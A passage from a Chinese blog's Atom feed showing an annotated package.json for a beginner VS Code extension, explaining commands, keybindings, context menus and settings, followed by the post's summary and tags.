class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span>                    <span class="comment">//扩展的名字  全部小写 没有空格</span></span><br><span class="line"><span class="attr">&quot;displayName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span>             <span class="comment">//&quot;友好的&quot;显示名称,显示在vscode应用市场 可以中文</span></span><br><span class="line"><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;描述 可以中文&quot;</span><span class="punctuation">,</span>     <span class="comment">//插件描述 建议写的丰富一点 可以中文</span></span><br><span class="line">        <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;vscode&quot;</span><span class="punctuation">,</span> <span class="string">&quot;plugin&quot;</span><span class="punctuation">,</span> <span class="string">&quot;helloworld&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>   <span class="comment">//自动生成没有 手动添加  关键词,用于在vscode应用市场搜索</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.1.1&quot;</span><span class="punctuation">,</span>                            <span class="comment">//版本号</span></span><br><span class="line">         <span class="attr">&quot;publisher&quot;</span><span class="punctuation">:</span> <span class="string">&quot;airx&quot;</span><span class="punctuation">,</span>                           <span class="comment">//发布者 请与发布者一致</span></span><br><span class="line"><span class="attr">&quot;engines&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>                                     <span class="comment">//支持的最低vscode版本</span></span><br><span class="line"><span class="attr">&quot;vscode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.45.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>                      <span class="comment">//应用分类,稍后详解</span></span><br><span class="line"><span class="string">&quot;Other&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;images/icon.png&quot;</span><span class="punctuation">,</span>           <span class="comment">//应用图标</span></span><br><span class="line"><span class="attr">&quot;activationEvents&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>                    <span class="comment">//表示插件会被哪些命令激活</span></span><br><span class="line"><span class="string">&quot;onCommand:name.helloWorld&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./extension.js&quot;</span><span class="punctuation">,</span>       <span class="comment">//入口</span></span><br><span class="line">         <span class="comment">//主要的插件配置项 据说叫贡献点 是个鬼畜名字</span></span><br><span class="line"><span class="attr">&quot;contributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                 <span class="comment">//插件设置,也就是在vscode设置中你的插件的设置项</span></span><br><span class="line">                <span class="attr">&quot;configuration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="comment">// 设置页面的配置项标题</span></span><br><span class="line">                          <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;helloworld插件设置&quot;</span><span class="punctuation">,</span></span><br><span class="line">                           <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                   <span class="attr">&quot;name.name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span>     <span class="comment">//数据类型,string即字符串</span></span><br><span class="line">                                        <span class="attr">&quot;default&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NoName&quot;</span><span class="punctuation">,</span>   <span class="comment">//默认是什么</span></span><br><span class="line">                                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;写你的名字&quot;</span>   <span class="comment">//描述</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                     <span class="attr">&quot;name.isYoungLady &quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>   <span class="comment">//是小姐姐吗 (大雾</span></span><br><span class="line">                                         <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;boolean&quot;</span><span class="punctuation">,</span>         <span class="comment">//数据类型: boolean,布尔值(真/假,对/错)</span></span><br><span class="line">                                         <span class="attr">&quot;default&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>       <span class="comment">//默认是小姐姐 (大雾  为真(true),假则是false</span></span><br><span class="line">                                         <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;是小姐姐吗&quot;</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                           <span class="punctuation">&#125;</span></span><br><span class="line">                  <span class="punctuation">&#125;</span><span class="punctuation">,</span>          </span><br><span class="line">                 <span class="comment">//命令描述</span></span><br><span class="line"><span class="attr">&quot;commands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name.helloWorld&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello World&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="comment">//之前说过了</span></span><br><span class="line"><span class="attr">&quot;keybindings&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name.helloWorld&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+f10&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;mac&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cmd+f10&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;when&quot;</span><span class="punctuation">:</span> <span class="string">&quot;editorFocus&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                 <span class="comment">//说过</span></span><br><span class="line"><span class="attr">&quot;menus&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;editor/context&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>     <span class="comment">//这里一会会详细讲一下</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;when&quot;</span><span class="punctuation">:</span> <span class="string">&quot;editorFocus&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name.helloWorld&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;navigation&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;editor/title&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>      <span class="comment">//编辑器右上角图标/文字</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;when&quot;</span><span class="punctuation">:</span> <span class="string">&quot;editorFocus &amp;&amp; resourceLangId == javascript&quot;</span><span class="punctuation">,</span>  <span class="comment">//当编辑器具有焦点,打开文件为js文件时</span></span><br><span class="line">                    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name.helloWorld&quot;</span><span class="punctuation">,</span>  <span class="comment">//显示命令name.helloworld (在右键菜单中)</span></span><br><span class="line">                    <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;navigation@2&quot;</span>          <span class="comment">//位置在最上层分组的第2个</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编辑器标题右键菜单</span></span><br><span class="line">        <span class="attr">&quot;editor/title/context&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;when&quot;</span><span class="punctuation">:</span> <span class="string">&quot;resourceLangId == javascript&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;extension.demo.testMenuShow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;navigation&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">             <span class="comment">//左边栏文件管理右键菜单</span></span><br><span class="line">            <span class="attr">&quot;explorer/context&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span>  <span class="comment">//该咋写咋写</span></span><br><span class="line">                    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name.helloWorld&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;navigation&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="comment">// activitybar图标，就是最左边那个栏的几个图标</span></span><br><span class="line">        <span class="attr">&quot;viewsContainers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;activitybar&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nameid&quot;</span><span class="punctuation">,</span>            <span class="comment">//id</span></span><br><span class="line">                    <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;标题&quot;</span><span class="punctuation">,</span>            <span class="comment">//标题</span></span><br><span class="line">                    <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;images/zc_icon.svg&quot;</span>  <span class="comment">//icon (图标,推荐svg)</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="comment">//暂时忽略</span></span><br><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;lint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eslint .&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;pretest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;npm run lint&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node ./test/runTest.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="comment">//开发依赖: bscode eslint等</span></span><br><span class="line"><span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@types/vscode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.45.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;@types/glob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;@types/mocha&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.0.2&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;@types/node&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^13.11.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;eslint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^6.8.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;glob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.1.6&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;mocha&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.1.2&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typescript&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.8.3&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;vscode-test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.3.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><imgsrc="../../../../%60warming%60%E5%8D%B7%E4%B8%80/%E4%B8%8A/2020_2/%E7%BC%96%E7%A8%8B%E6%97%A5%E8%AE%B0/images/Y3pIbQ.png"alt="Y3pIbQ.png" /> <imgsrc="../../../../%60warming%60%E5%8D%B7%E4%B8%80/%E4%B8%8A/2020_2/%E7%BC%96%E7%A8%8B%E6%97%A5%E8%AE%B0/images/Y39aIs.png"alt="Y39aIs.png" /></p><h1 id="待更">待更</h1>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;此文章的 &lt;em&gt;撰写时间&lt;/em&gt; &lt;em&gt;撰写日期&lt;/em&gt; 绝对有问题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;此文章的部分图片可能无法加载。这是因为大概这一版的博客搭建在云服务器上所以图片没有用图床&lt;br&gt;
&lt;del&gt;为什么呢？难道云服务器流量不要钱吗？白嫖图床不好吗？&lt;/del&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;概要&quot;&gt;概要&lt;/h1&gt;
&lt;p&gt;主要借助右键菜单和快捷键讲解一下&lt;code&gt;package.json&lt;/code&gt;.
&lt;del&gt;没错我就是标题党&lt;/del&gt;&lt;/p&gt;
&lt;h1 id=&quot;添加右键菜单和快捷键&quot;&gt;添加右键菜单和快捷键&lt;/h1&gt;</summary>
    
    
    
    <category term="扩展开发" scheme="https://amiriox.github.io/categories/%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="迁移" scheme="https://amiriox.github.io/tags/%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
</feed>
